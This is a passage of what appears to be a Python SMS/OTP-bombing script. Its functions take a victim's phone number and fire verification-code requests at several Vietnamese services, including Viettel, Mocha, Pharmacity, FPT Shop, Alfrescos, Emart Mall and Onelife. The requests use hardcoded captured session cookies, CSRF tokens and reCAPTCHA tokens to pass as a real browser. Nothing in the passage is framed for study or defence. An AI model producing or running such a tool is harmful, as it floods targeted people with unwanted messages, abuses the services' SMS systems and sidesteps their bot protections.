        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': sdt,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)

def dvvtlogin(sdt):
    cookies = {
        'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF',
        '__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1',
        'XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
    }
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
         'Cookie': 'laravel_session=5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF; __zi=3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1; XSRF-TOKEN=eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
        'DNT': '1',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    json_data = {
        'phone': sdt,
        'type': '',
    }
    response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)

def mocha(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'Origin': 'https://video.mocha.com.vn',
        'Referer': 'https://video.mocha.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'msisdn': sdt,
        'languageCode': 'vi',
    }

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)

def pharmacityzl(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'origin': 'https://www.pharmacity.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.pharmacity.vn/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'x-device-id': '1c061acd-1f25-48a0-bf37-3a5bd2d17fd5',
        'x-device-platform': 'Chrome',
        'x-device-platform-version': '130.0.0.0',
    }
    json_data = {
        'phone': sdt,
        'recaptcha': '03AFcWeA71hBoCdeMdfT1eLmeo_xzrsDNALTKVUrhgAVleQETMW8IzPQQqeWkyCxTZjbWlx1joyKyYFLFvTb1ls3Xvye2m53V3ASgAnxmO2202pod0dVnlpLr6h-XHAE4GnEYERlJk1VL_yhIhEf5-kfK7xeAsSby-OitFItWxBkyu-OTiiMi3mn9VWlzRJNcO80qvja5uO9rEV329lYEUm_oeMEcMkYQnmPtY9YRFlOvkzdPv-3nalDVeco24dd5sNo5HMc6of3ANdler7Bnrw81AGYLMMYx34VZ59gOuxJwcz6EjtFONpEYTEBW1qezgP9ss2vOuUP6qIqOUsV8kw8Kq2qEovz7tnJvKD5uoqeLbezH_43lX30klGTPkq_CKbfehxJwhFCO3VKTofGqRg-gDvMec8jcb0pV_eDLKH4uIwoQd_VjuLuGfWBA41dXiCGgeA4I-A_x9UK1db3oustZgF-hwUNx4fD5X-OjtwiJ49qz8035jJ4FVnxv4OsbNfV1dEsTb3bM0pddb8hiqOTCNBrLRulo5iLXOSz84mZyUIesUNM1Ek5KSx2dH8JYywmWhVv5sj0AaBHJ-9fyyDrejPJyRktk7J5mKXXYs38eNfoMd-2lpJun4YunvMSejrb01bXRKJ3dKxm-8SrW6tKjxCzWszQuBxwTWXphO2aqjJ-jmaEvUAHr0v7Kcp4CRKfjaMWN4IGuNmsdhig-sdgGy51Aic5i0S1UWDEeveEjotaxIMri2m4AHQC1FSLx0eGtBIa8B-AZCoHOeLn4YzeVYxCHfb3FeqJv4piIZesAhnMLmRSQqCEI9P2bj5fkQvGJFck28MmiSQrbZXp9h5jF6Vf6v-1D5QImvMAufk-rRG7vdEQ-WVFyy2ifvd6vzGMrxI79m234a3YhNpMxViAgkPFhTRR9GzA1JWi1gl9Y1KpgTmG1z5SxXhOsXeYJWuToTL_FN0Rpw33llum1MeUp9275JeLp302rdFiIPt-3xtrYc5ayoDHSl49kCCUlmqbzQyuTUiDamL6TdA2ahsgmmi71c0Dwdn-HCuht22bvTKCoO9WfXCtwijSNNX5C5T_pr3JPbzp3givFXFpEDhnyRUco3IbV9SHwj3UaCGFZMMHKm67ZzjUnMt8I1FRFaSoyp_S4qsSojgZc-WojwrbOIzzrHn2s3kQtbKXa1HJ6SX6spqDpB7bctFR2xTAvRHZ8z8mbkbdse0kKc2X_z1OU3TyHnwhCt_4LRKdnE8diJQTgU9dn2LgMBDBWbqd0mOOLU8r2k7EVZfNB1mdoOTlhgJ-Pf2R1bCYKk3h-G7Z1cCt3Jg2FSaILpK-sg61zzH8DxFmdl-bOAtv-bFT4Wcaj7ngRAJrXw8C7boO92kEsUaiQKH6G3aNeGHfbRQcl1WhFMwjdwd4uaB3S3R6C-EGUrsbgQSVPQFXGBWv-r2JE-5FnCxk6C6-GJQpcYjVxEUrmWGZ4lli1Em8Ga8y6BumkrS3qOmgRY9JNKBMdvjJyEY-iPsA9T1X5DO3ilhVXhVkRl2VPlCaKHdyZi1Pqhk87-WBatfRABi88hzSr-gZcRy5I--QTTy4zFsfyowi4oGoxj7nOmZLAkMJ43Sk8P8ucC27m4SP6mDW0u7WHTkImcw1CT9GFwUXCw4VBXli66zHyUUiiHbEZcRxtbtQPat2MA5m-25Tj-GHpQAqBtubyAZYddclU_bUPSusKtQC6UQgiie5_LsslYgmSe85o5UiyeEiKs8Lt1nxc2Cor3WUDhw6IAVd2O6xnb_DpxGh7-kE8pA8QqXwwSqXL4nf7ccLRvVi_M2apsowruUFyAyZgXtNjl8NGz1v4OY34HrA2GrlMecodcNFEtRi4-50VUGbd-GgWrFyTqb4WSRxSsJWKa4IXvZ_flI9cmclRenKIpoufwqVS87tVx6JlxbnWH-cxnTMFYDChtfgkrnc7bq48jDM_lcsda6TCLonu3pZv5ZBOz2iy0V9KB',
        'version': 'v3',
        'voice': False,
        'method': 'zns',
    }
    response = requests.post(
        'https://api-gateway.pharmacity.vn/pmc-ecm-auth-api/api/authenticator/customer/register/otp',
        headers=headers,
        json=json_data,
    )

def pharmacitysms(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'origin': 'https://www.pharmacity.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.pharmacity.vn/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'x-device-id': '1c061acd-1f25-48a0-bf37-3a5bd2d17fd5',
        'x-device-platform': 'Chrome',
        'x-device-platform-version': '130.0.0.0',
    }

    json_data = {
        'phone': sdt,
        'recaptcha': '03AFcWeA6JyNpDXJVm4KJ7mgKvQ2R5QlYs9v7UqjfJ8FRZnmR3Vb8mtm-IG5LVj71Acsr4jiGX6AH0IaSW_pfLbElIfMcPQAr7pRgKfZ6BNXvSknPAosZeKTieDe-A7Wi6_5ceZuivh8EEiSYUcmbmwIcCArqAcMRNjyEgp3gd3SxMPFocsGltJFAyNxqcESVLsq1MyQ55yc2W4rW4tPCJTwSPKhhg35oFGkAvTN2vodZ3rZ6oceT9O1uZdpBOikJAuL83neRP6lRns8YqP49UNl42uRHOq59g4L598PddWrM-bWP37RzU17GuHAuAdUrm0x6ZfOtAk29m8fmJU0RgKyCcspAw3UYKEYA1fZOw080HCmk_O_gVPxSY1o5vf1Wfsd-dwzX7Ry8qB68KtxNDmbYh-de6ilW6FJR5AGgGAHTKUIiZcU9GLhY3kZCBPFG4GN-ZT74xhk2pLoipDb26w01KKr1Fokbe7HsrczDShPDQhfd9F7cyVjlzW7Ff3zBsJ1fhrTdOnfz-lfDyhfp3iAfKPrqn55SCK0dr6nyK7SqKIy_TCrHUqKyO9iGQTo2CeSku66PGsmtDutkhZPId3dEm1CGYCCcnm8vNVfc6xlErr5cKbFjbYFRFohJpcVivQOCK0kZ5yp4YOvwoMRO-NjrKCeZrM1uJduPmAqoKVdtEH9tcfi2G398XQ77Iugg6QkkJDyD72zz_uMlYL8gbZQWXYtAjXlcG5-j5TUEHOsPBlAnWhNLrhAOhoNac5X1RNvTJgjeJbNeUtDU-p5MGYj_ym851-yHpDlrBVPOtJbjIa62dWU2kXB6oC2tDBhgQzhonBAxfkTJ7OTeLf4KOPERb8RCEMmZqL7PnvqmweLac2YrQbGFm8hdqRMQJ-FiA24ETE-yXCleN50UZqC5_uMhJUMVOZzIrNaDXPZrORUbEtiHRZDlsGtN7bd4GY1QRrvhneKY3au8FbGH8624nUMQ_zUXkQc8q2kGh_uaulYxK1YqhnbbQfDQZr0Rjev-VIwYAvrlzZJVSWV-FPKBT1AIIOSowb9v_4tnXcu4GMnZ4W_5uWt8NuixT3Bb2aIa_aleYwqaAVipfodxH36pbqDOtCylmDvmy78K-mlOK5T9uiSygRprHF6UsWYBpYIWqd1LYudapPBmVdAAWyxqyc16uyRzhfp0oj0qFUzWnzlMM6Ej0twwFflkRbmQ5qFEkMNFIV4MYvgL8YotTM5mcvtRhZUyQhLl8FbE_Ok-t3LflmZf8liJnA_FL3jwrOIoF208SuWx45mgHV3DduvL2y00cq7NSQdZ6cUTQ04U_nV5xyYE_4KtvTzMJ325JtuMqGPPwNO366m3GnTM6f8UA2zkWkRYo1bWrmwjVaPp3IgpxxvK0Fm6qyOqrG147vlJpjoi4Y76okZMe0ATp1UTvadeSOJQyTdOMRR2nVSeO3LwJoCgpYdtiTgUTgnae-tAImZDjevPljEfyAWcCL2hBWgp_DbMOVxVnWIqQ-Z80j8l5CcD3NraisJm-lRkQPZPfdrEt7cZ4cUl9iCBKRH8Dx0YG93EwFW_8tI7IHdeupq8PYN-RFpqa_dfbsraVeobFMaZ6nJ50XI6wYWhZaUUKwMGkIjEGIUg4yP2fdwJEYk8EEOEDjXNWTZTjzL-rpEqn7NCHB_yC6HjLvabvBJNAsI3QbbgaI7Nz9B_TExlj9XBf8zqwhWIH5ScYE3XELy7IuDZoB-dKoRo0dnXxlw6MXrfQcHCu-93wW-pUKb8IQiVR3TxtCrCmWtl4880a9Y7t5mXGMUAKOPKhJ_ETtea5t-y4k16OQkpxX8m76KAB_b9E9XwzEUvPzh62ZwWNH9Fj9BBEuetwHNPdMFPbRHOsvCttZ8rBD9YuXqy2T_lYdyKUY_U0gH62wcL2QwvOEaK_EWyKOCmsgHVicJXqgCiqEKT3E0YIFjPCsfLQh-rAPRsVeD0wnQibNoGjbHovsIbhgRn9ht_BOLEP',
        'version': 'v3',
        'voice': False,
        'method': 'sms',
    }

    response = requests.post(
        'https://api-gateway.pharmacity.vn/pmc-ecm-auth-api/api/authenticator/customer/register/otp',
        headers=headers,
        json=json_data,
    )

def fptshop(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://fptshop.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptshop.com.vn/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    json_data = {
        'fromSys': 'WEBKHICT',
        'otpType': '0',
        'phoneNumber': sdt,
    }

    response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)

def alfrescoszl(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN',
        'BrandCode': 'ALFRESCOS',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'DeviceCode': 'web',
        'Origin': 'https://alfrescos.com.vn',
        'Referer': 'https://alfrescos.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'culture': 'vi-VN',
    }

    json_data = {
        'phoneNumber': sdt,
        'secureHash': 'e95075f897d7f9649b5b294eea901f18',
        'deviceId': '',
        'sendTime': 1731081128869,
        'type': 1,
        'otpType': 1,
    }

    response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, json=json_data)

def alfrescossms(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN',
        'BrandCode': 'ALFRESCOS',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'DeviceCode': 'web',
        'Origin': 'https://alfrescos.com.vn',
        'Referer': 'https://alfrescos.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    
    params = {
        'culture': 'vi-VN',
    }
    
    json_data = {
        'phoneNumber': sdt,
        'secureHash': 'e95075f897d7f9649b5b294eea901f18',
        'deviceId': '',
        'sendTime': 1731081159702,
        'type': 1,
        'otpType': 2,
    }
    
    response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, json=json_data)

def emartmall(sdt):
    cookies = {
        'emartsess': '274holp3bqk94s1jppu4p5jbc3',
        'default': '37875d52db482386bda3c16e06',
        'language': 'vietn',
        'currency': 'VND',
        '_fbp': 'fb.2.1731081331859.742306166888830090',
        '_ga_ZTB26JV4YJ': 'GS1.1.1731081332.2.0.1731081332.0.0.0',
        '_ga': 'GA1.3.1143236911.1722959601',
        '_gid': 'GA1.3.2125184111.1731081332',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'emartsess=274holp3bqk94s1jppu4p5jbc3; default=37875d52db482386bda3c16e06; language=vietn; currency=VND; _fbp=fb.2.1731081331859.742306166888830090; _ga_ZTB26JV4YJ=GS1.1.1731081332.2.0.1731081332.0.0.0; _ga=GA1.3.1143236911.1722959601; _gid=GA1.3.2125184111.1731081332',
        'Origin': 'https://emartmall.com.vn',
        'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'mobile': sdt,
    }

    response = requests.post(
        'https://emartmall.com.vn/index.php?route=account/register/smsRegister',
        cookies=cookies,
        headers=headers,
        data=data,
    )

def onelifezl(sdt):
    headers = {
        'domain': 'onelife',
        'x-ol-thumbnail-height': '250',
        'sec-ch-ua-platform': '"Windows"',
        'authorization': '',
        'Referer': 'https://onelife.vn/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'accept': '*/*',
        'x-ol-thumbnail-width': '250',
        'content-type': 'application/json',
    }

    json_data = {
        'operationName': 'SendOtp',
        'variables': {
            'input': {
                'phone': sdt,
                'captchaSignature': '03AFcWeA7ekK6Ajc1b6BDmxlAZQRkhjwq3TN7ons-Rtle1dd5p8t5vkf899NyOAkTY9e_em5Ud7naRvZVBbiUXc9iMAz_-A8bd0P8etE4Hmd8t9UKevNep10VHtQIYtRglnapOuxnaw_iWrBiXzjVa1T9UvrytxjsuQczEGhSCzbWu9Zka9_z0GiLpTRxdkWVb7Ryj1TnVfaLt2vJa1xnEVHLePz5NnYzKvi38ORQn_r2mmL4iE5w9vKdsGPd0Khg02JeVFwY-XkHfE6IBiB98EwDc1xtKx3-6REQ5zHal39kGSVRxgN08WCFLUPScXPBD6t5ftcNTl14YlnrkPtkhuQLmiMlZq4CN46Tx6q62Rke0MsR_3h9c287x_oX3g-Y_orm44bYQmlbpienB8zZueeBbWIsJ4tcbQ6WhRmeXsYFW92s5gdKKindWgotKQZGN0DAuHldmNNhhBLOkeFKKxOt7ViRQWM5MA0HMTzp4_JMxLFHqgQgj2yLqP0atV5eOqmNfRaew5SKhJ1mXgsX618CVKHaoNbBtn2pb6dJOkXVyaf0mBailtNftgUYt75qCr-OIow5mIo8PPAZ6kb09cVZ9B1wYWwgU5YUBhH6EPyFF1626cK6-J_KQUPxHs7jB3fHZ73f8FF0W7i6E1Z0f3BiAyZsni22C1gjSH5xNbZxvN4Zqy1JvZozaLDotz_St8tlnCdwCjFH5RdYWC1aINApHX9I0x8tbHGPmEZNsnIU_3vcjNOWByAKXU1TpzXeViowkkbVw1AM7DM-bUcY4r2DuFYeL0V5vev2CGbLV7R4QHt5TzobHfJheTJBlJRlpj3YwOEPCqTSCuTNrNjgw8eBeS08Ng7w5S482bkIRYRGTRpyvgxHyK3h9BcSkIwHPD9ltnLIP0feAa0DF2vpXUChRFPN1q7K4qz372vf1d0jM--3Yvv9Xan93pg2pIDGrOasPXDAZjAVRKHRu2VBlY_jGxdI6qPBZCgoWKKP_XskfZIoJWWNoT58L9FewXdNAZ6Tfxk7DoNuNVwrZB__AU8RYbYOX6Mdput-lvghsKypb_sucp0x9xqWAWar7V4tq5tH57bpsk7UBBLMnen2OZEKAqD_Ls5FbIWQyuAgJjslQGZa6DQ-3fY9Kwj9Bs5YdK6jz-bO7Pmfy3NNj-lxZiO-8VQfWMuA9sObSY6_r7wgQT2TjEFPHzRyI4c36o_jwRqL-NRmTGFMTq5-XfKusC45cG_IZD-ifK0OUNRtSD2OQALLAVM9T8GoLDlsBeTmeH9NlGSZuN9HQAhR5YjxNSOX7j18_LXr5SkoBi2glOe-_GQrmhYSHPjznC39SUHV3DBRy9J-yH5PeFfjMMdSXxaZ8JqbQkf6Lj-1LXjllYfieAT7SdVrTnezSYSotAgJF8B3wFGDYEwIa90CmId5tKiqOe0iRMqDX9gQAYKkqkV5RHLbazk_xt_RXYcAoYYEHBD4bf2NlvCwmWL6ZO62YNGb2lzfBRmJvjUrkUFwW6jIXbmRyQZqzVo-fm2aqK3sdP2olLSeIfT-cXUbvbHFtR6HUhig-4bDJwU7zva5fiSpRsNgNG2UnzJyVczI5IzLO1io5nzPZ_U_Iu2OyqSgpHKPPK_1OR6OEuJzNawwrgDSQeLxkGyprXxqptoRVhkPk9VltqrYssqYPFX-kN8nSwumaoCujG4HmYJ7uhcBBteLOi_KpwzddlStmmncUUe16-9oedlaD2kNSM2B_n2V_hFvNgeSJIRelQ8nCtatuSWkX7RPPv1oJKiyJP-Z9aItEKIdkqm7Oi5Z9gJpfFqRT47ty4N62S0_h3k9Yg6JIgp-GNLShHezrxwFcAEsmaYECD3KEdmXCeqWhjnpOZmPVHxoQ8IJgrIrBbvWkwm3PvEvzIxifdHSfv1_fw5me6IgpWQAJXgZER0vlLrA32PXzoL-bKVGX3FLndnAB7-HpQsnt56G2ESh_oWKwh6lUaRVQeGlCcbhTh2iP',
                'method': 'ZALO',
            },
        },
        'query': 'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)

def onelifesms(sdt):
    headers = {
        'domain': 'onelife',
        'x-ol-thumbnail-height': '250',
        'sec-ch-ua-platform': '"Windows"',
        'authorization': '',
        'Referer': 'https://onelife.vn/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'accept': '*/*',
        'x-ol-thumbnail-width': '250',
        'content-type': 'application/json',
    }
    
    json_data = {
        'operationName': 'SendOtp',
        'variables': {
            'input': {
                'phone': sdt,
                'captchaSignature': '03AFcWeA4UOquPUEZDC5u5unNRVQ4x0wvI92_L3EY6t5nZEHjJmdZKJNPrOBNGRDB4LkoVF8FrtVnSyjX7290Bj3FlbEMk7EkiIcEZAeP5NPAgktTEACUiofOTXB_VN1lKri-ZaYsRSZ4rckYijBfuhNgmN7A_4ihCpSOVi3nO7JzBufLuDWXSGyTyXeOSlNl75-py0dI9ZY6vLyzvdloX3SoWaAv3fr6YIKShiaDtN2ql_PoEaet1quN8QVF_h9wYkJxhwVpGJoPo_r9d_tO9eFg16lcUawAFOiiGIlGuJTfvuWHtbzgjnLSi9FRffLTIN54Mg7L-MIyhIKQdWMlJA5ZZl2zkRCVfOXlKXDePeD_kpaa1bC6Dl4Wz5-ZbeBGlDSxOiWKwhKHDOvm3jpRQ9cF0NV8CrUIp4Wg_7vzhgts1eJcuLepWFmxah-m975b33DX3qwhHyk1MADD2uCK80JiVOJiCG5nRQbEGWo9iawGF1Y5hSIHnOdnkbYJU8tyr4rQYu219nCaBc645o4RAYvt0W9IjvZtsg6f-WLHUeBgWvvHjSa0ULcidOqctAsuORuidOXRXFyJvf8WkPy5Wo21EWkyx_EDBrZBAhYYVtZNSHJYOSeU-3IBftuCeFMcDINboAAjJDakyYNciOpl8V5Y-ABBg7FIoSUtZ5bBVz3TNGf_0IX6PM-i72HzKIgqTemXwevvspV28UmtT1Z0eJ9_hWTNOvmP0ucfu-XYWe8FxUgUdX7SXcqY7BPkGxi_TjoaPXur2Uipzq1U7k9umqnAbpQDrQw___kO02GYxYP6CczdcNv-9TnA7ukNKt2Kmc9MSN1BgbPazcH37bgPNyqWtGYAN9LlFNNDc6mqKGzs8c38JhQuubrSCPNVXQr0FilbYGVaIz7T3FJZ6b7VGU-ae6P-1GQlFaV7sVwrHblwaGBr9Tzy3jt2aRmzo13xOZcqkiz6iosmKXYNgVCjLol5EmiZq4hSfbRbBDx1wRVVCiq4vnVEZn2Bv1hsQ2_-qjs1_XnohuCVkn4u44YIkPko0ChGfav6TIqGvrEssb1LPnxPtDlIUI6g4iNydHhWYfnIgfE1AL4eYhhjRTW9_V63nZH8ftkCEG6szuI3MI8oQAEC99cfKevdONRQCAxkDH4EYPt3QMERCFwJ1vjsVz5hU7Ix6HYONsRCrEIS41S4h0c_5KrUHBqpwR-CLr6RohlgoBG1ui07JX6T52NGPU9M_t0qjizPGzMN6L_qIpPJAeANYMT94eMOGiz3DPxoOMIXgibmK9sRPrfplbnihuLX2b4M0HFAclLGPpMG-S3JMNtHpwOL7dJK-HvqyJbOYyp06lmdD14iBaoxbps3avpGRSotZa_aaRZ1nGtZOBM4NNNAIsBC7RIfUmEpPqpnjUrpMasohivUvTZAqnmnMyKt6cbPgxAajEn_ewphKWlphCISYrxriyk-Q36Y5J21SZAt8zsC156Gsx3xuziK8WrnZGuhjoB6-6NVh_6EhN5a_qj-oG0x4dY_J5aDSZ1NbXkNoBhwOKYJJXjuqfwBYXJSD-zPeKNUJ8SiRkQ6BXukLuozB7PN7FJqU7OVL5zKfzlgXnN0tBFHQgw8tONvy1eczPdajN9BcCDy54X4eTEEphNyh0bobEbpAOLVKA6SCKC_FY8smu0YbOAxfRuoxN4HWF9wi6sLRjZ-_bskzfaUsbp70Rf8rjNtNTFVpED-lKN-uWmTn9DZeJzhqNq45mpBpoi8smBJ0vz26kcQrPaUyZezlvW4ZUhQyd_KfLXzUPrCbHNs73Ok7d17WOkDF4cp2GjYDI_0DzwujSnSiI5s6vlFi-JR58BUoPHZtS37fhQezpyWTkcH6_2nknb8zLiFE7PtbDntnUDdcQltBgkEfYkHGlsml1181WZT3_8H8hhdWHRuUazb5UNAi6mjtnCAjQILbxZE0jU5Mkw7uxyOficzBMYBLhqGmzqSLWaqLVC0kDiPWs243tH1qunmKuzJ4WZhs46m6bA',
                'method': 'SMS',
            },
        },
        'query': 'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}',
    }
    
